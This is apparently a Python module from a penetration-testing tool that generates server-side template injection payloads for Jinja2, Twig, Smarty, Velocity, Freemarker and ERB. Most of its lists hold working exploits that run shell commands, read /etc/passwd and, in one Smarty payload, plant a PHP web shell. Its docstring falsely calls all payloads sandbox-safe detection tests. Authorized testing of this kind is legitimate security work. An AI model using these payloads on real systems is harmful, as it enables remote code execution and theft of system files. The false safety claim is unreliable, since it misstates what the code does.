"""
PayloadForge SSTI Payload Generator

⚠️  ETHICAL USE ONLY ⚠️

This module generates Server-Side Template Injection (SSTI) payloads for
authorized security testing and educational purposes only. Never use these
payloads against systems without explicit written permission.

Template Engine Support:
- Jinja2 (Python)
- Twig (PHP)
- Smarty (PHP)
- Velocity (Java)

All payloads are sandbox-safe detection tests - they do not execute
harmful commands.
"""

from typing import List, Optional, Dict
from payloadforge.logger import logger


class SSTIGenerator:
    """
    SSTI Payload Generator for ethical security testing.
    
    ⚠️ FOR AUTHORIZED TESTING ONLY ⚠️
    """
    
    # Jinja2 (Python) SSTI payloads
    JINJA2_PAYLOADS = [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{config}}",
        "{{config.items()}}",
        "{{self.__class__.__mro__}}",
        "{{request.application.__self__._get_data_for_json.__globals__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{lipsum.__globals__}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}",
        "{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if hasattr(x,'__init__') %}{{ x.__init__.__globals__ }}{% endif %}{% endfor %}",
    ]
    
    # Jinja2 detection payloads (safe)
    JINJA2_DETECTION = [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{7*'7'}}",
        "{{dump(app)}}",
        "{{app.request.server.all|join(',')}}",
    ]
    
    # Twig (PHP) SSTI payloads
    TWIG_PAYLOADS = [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{dump(app)}}",
        "{{app.request.server.all|join(',')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{['cat /etc/passwd']|filter('system')}}",
        "{{['id']|map('system')|join}}",
        "{{_self}}",
        "{{_context}}",
        "{{constant('PHP_VERSION')}}",
    ]
    
    # Twig detection payloads (safe)
    TWIG_DETECTION = [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{dump(app)}}",
        "{{_self}}",
        "{{constant('PHP_VERSION')}}",
    ]
    
    # Smarty (PHP) SSTI payloads
    SMARTY_PAYLOADS = [
        "{$smarty.version}",
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}",
        "{system('id')}",
        "{system('cat /etc/passwd')}",
        "{math equation='(1+1)'}",
        "{fetch file='/etc/passwd'}",
        "{if phpinfo()}{/if}",
        "{if system('id')}{/if}",
        "{self::getStreamVariable('file:///etc/passwd')}",
    ]
    
    # Smarty detection payloads (safe)
    SMARTY_DETECTION = [
        "{$smarty.version}",
        "{math equation='7*7'}",
        "{fetch file='/etc/passwd'}",
        "{if 7*7==49}true{/if}",
    ]
    
    # Velocity (Java) SSTI payloads  
    VELOCITY_PAYLOADS = [
        "#set($x = 7*7)${x}",
        "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
        "#set($str=$class.inspect('java.lang.String').type)",
        "#set($rt = $class.inspect('java.lang.Runtime').type.getRuntime())",
        "#set($chr = $class.inspect('java.lang.Character').type)",
        "#set($ex=$rt.exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        "$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')",
        "#set($runtime = $class.inspect('java.lang.Runtime').type.getRuntime())#set($process = $runtime.exec('whoami'))#set($reader = $process.getInputStream())#set($scanner = $class.inspect('java.util.Scanner').type.newInstance($reader))#set($out = '')#foreach($i in [1..100])#if($scanner.hasNext())#set($out = $out + $scanner.next() + ' ')#end#end$out",
    ]
    
    # Velocity detection payloads (safe)
    VELOCITY_DETECTION = [
        "#set($x = 7*7)${x}",
        "${7*7}",
        "$class",
        "#set($x='')$x",
    ]
    
    # Freemarker (Java) SSTI payloads
    FREEMARKER_PAYLOADS = [
        "${7*7}",
        "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign classloader=object?api.class.protectionDomain.classLoader>",
        "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}",
        "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
    ]
    
    # ERB (Ruby) SSTI payloads
    ERB_PAYLOADS = [
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= IO.popen('id').readlines() %>",
        "<%= require 'open3'; Open3.capture2('id') %>",
        "<%= File.read('/etc/passwd') %>",
    ]
    
    @classmethod
    def generate_jinja2(cls, count: Optional[int] = None, safe_only: bool = False) -> List[str]:
        """
        Generate Jinja2 SSTI payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            safe_only: If True, return only detection payloads.
            
        Returns:
            List of Jinja2 SSTI payload strings.
        """
        logger.log_ssti("jinja2")
        payloads = cls.JINJA2_DETECTION if safe_only else cls.JINJA2_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_twig(cls, count: Optional[int] = None, safe_only: bool = False) -> List[str]:
        """
        Generate Twig SSTI payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            safe_only: If True, return only detection payloads.
            
        Returns:
            List of Twig SSTI payload strings.
        """
        logger.log_ssti("twig")
        payloads = cls.TWIG_DETECTION if safe_only else cls.TWIG_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_smarty(cls, count: Optional[int] = None, safe_only: bool = False) -> List[str]:
        """
        Generate Smarty SSTI payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            safe_only: If True, return only detection payloads.
            
        Returns:
            List of Smarty SSTI payload strings.
        """
        logger.log_ssti("smarty")
        payloads = cls.SMARTY_DETECTION if safe_only else cls.SMARTY_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_velocity(cls, count: Optional[int] = None, safe_only: bool = False) -> List[str]:
        """
        Generate Velocity SSTI payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            safe_only: If True, return only detection payloads.
            
        Returns:
            List of Velocity SSTI payload strings.
        """
        logger.log_ssti("velocity")
        payloads = cls.VELOCITY_DETECTION if safe_only else cls.VELOCITY_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_freemarker(cls, count: Optional[int] = None) -> List[str]:
        """
        Generate Freemarker SSTI payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of Freemarker SSTI payload strings.
        """
        logger.log_ssti("freemarker")
        payloads = cls.FREEMARKER_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_erb(cls, count: Optional[int] = None) -> List[str]:
        """
        Generate ERB (Ruby) SSTI payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of ERB SSTI payload strings.
        """
        logger.log_ssti("erb")
        payloads = cls.ERB_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_detection(cls) -> Dict[str, List[str]]:
        """
        Generate safe detection payloads for all template engines.
        
        Returns:
            Dictionary with engine names as keys and detection payloads as values.
        """
        return {
            "jinja2": cls.JINJA2_DETECTION,
            "twig": cls.TWIG_DETECTION,
            "smarty": cls.SMARTY_DETECTION,
            "velocity": cls.VELOCITY_DETECTION,
        }
    
    @classmethod
    def generate_all(cls, safe_only: bool = False) -> dict:
        """
        Generate all SSTI payloads categorized by template engine.
        
        Args:
            safe_only: If True, return only detection payloads.
            
        Returns:
            Dictionary with template engine names as keys.
        """
        return {
            "jinja2": cls.generate_jinja2(safe_only=safe_only),
            "twig": cls.generate_twig(safe_only=safe_only),
            "smarty": cls.generate_smarty(safe_only=safe_only),
            "velocity": cls.generate_velocity(safe_only=safe_only),
            "freemarker": cls.generate_freemarker(),
            "erb": cls.generate_erb(),
        }


# Convenience functions
def generate_jinja2(count: Optional[int] = None, safe_only: bool = False) -> List[str]:
    """Generate Jinja2 SSTI payloads."""
    return SSTIGenerator.generate_jinja2(count, safe_only)


def generate_twig(count: Optional[int] = None, safe_only: bool = False) -> List[str]:
    """Generate Twig SSTI payloads."""
    return SSTIGenerator.generate_twig(count, safe_only)


def generate_smarty(count: Optional[int] = None, safe_only: bool = False) -> List[str]:
    """Generate Smarty SSTI payloads."""
    return SSTIGenerator.generate_smarty(count, safe_only)


def generate_velocity(count: Optional[int] = None, safe_only: bool = False) -> List[str]:
    """Generate Velocity SSTI payloads."""
    return SSTIGenerator.generate_velocity(count, safe_only)


def generate_all(safe_only: bool = False) -> dict:
    """Generate all SSTI payloads."""
    return SSTIGenerator.generate_all(safe_only)
